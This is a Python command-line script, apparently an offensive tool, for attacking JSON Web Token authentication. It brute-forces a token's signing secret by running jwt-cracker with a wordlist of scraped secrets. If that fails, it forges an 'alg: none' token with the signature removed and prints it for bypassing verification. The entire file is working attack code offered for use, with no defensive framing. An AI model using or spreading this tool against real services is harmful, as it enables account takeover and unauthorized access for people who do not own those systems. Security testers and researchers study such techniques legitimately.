import subprocess
import base64
import json
import sys
import time

def count_lines(filename):
    """
    Counts the number of lines in the given file.
    """
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return sum(1 for _ in f)
    except Exception as e:
        print(f"[-] Could not count lines in {filename}: {e}")
        return 0

def jwt_crack(token):
    """
    Try to crack the JWT token signature using jwt-cracker with a fixed dictionary file.
    Returns True if secret found, False otherwise.
    Also prints time elapsed and number of secrets tried.
    """
    wordlist = "scraped-JWT-secrets.txt"
    total_secrets = count_lines(wordlist)

    try:
        start_time = time.time()
        result = subprocess.run(
            ["jwt-cracker", "-t", token, "-d", wordlist],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        elapsed = time.time() - start_time
        print(f"jwt-cracker finished ({total_secrets} attempts in {elapsed:.2f}seconds)")

        if "Secret found" in result.stdout:
            print("Secret key found!")
            print(result.stdout)
            return True
        else:
            print("Secret not found. Creating token with 'alg':'None'.")
            return False
    except FileNotFoundError:
        print("jwt-cracker not found. Make sure it is installed and in your PATH.")
        sys.exit(1)

def forge_none_alg_token(token):
    """
    Forge a JWT token with the header alg set to 'None' and remove the signature part.
    """
    try:
        header_b64, payload_b64, _ = token.split('.')
        padded_header = header_b64 + '=' * (-len(header_b64) % 4)
        header = json.loads(base64.urlsafe_b64decode(padded_header))
        header['alg'] = 'none'
        new_header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        forged_token = f"{new_header_b64}.{payload_b64}."
        print("Use the following token to try to bypass token verification:")
        print(forged_token)
    except Exception as e:
        print(f"Error modifying token: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <jwt_token>")
        sys.exit(1)

    token = sys.argv[1]

    if not jwt_crack(token):
        forge_none_alg_token(token)
